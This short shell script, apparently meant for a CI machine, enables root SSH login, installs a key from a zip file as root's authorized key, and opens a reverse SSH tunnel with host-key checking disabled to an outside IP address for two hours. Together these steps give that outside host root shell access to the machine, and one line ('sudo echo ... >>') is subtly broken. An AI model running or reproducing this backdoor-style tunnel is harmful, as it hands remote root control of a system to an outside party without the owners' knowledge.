sudo apt install -y openssh-server
sudo echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
sudo service ssh start

OWD=$(pwd)
cd /home/ci
eval $(ssh-agent)
unzip ${OWD}/files.zip
ssh-add id_ed25519

sudo mkdir -p /root/.ssh
sudo chmod 0700 /root /root/.ssh
sudo mv id_ed25519.pub /root/.ssh/authorized_keys
sudo chmod 0600 /root/.ssh/authorized_keys

ssh -o stricthostkeychecking=no -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

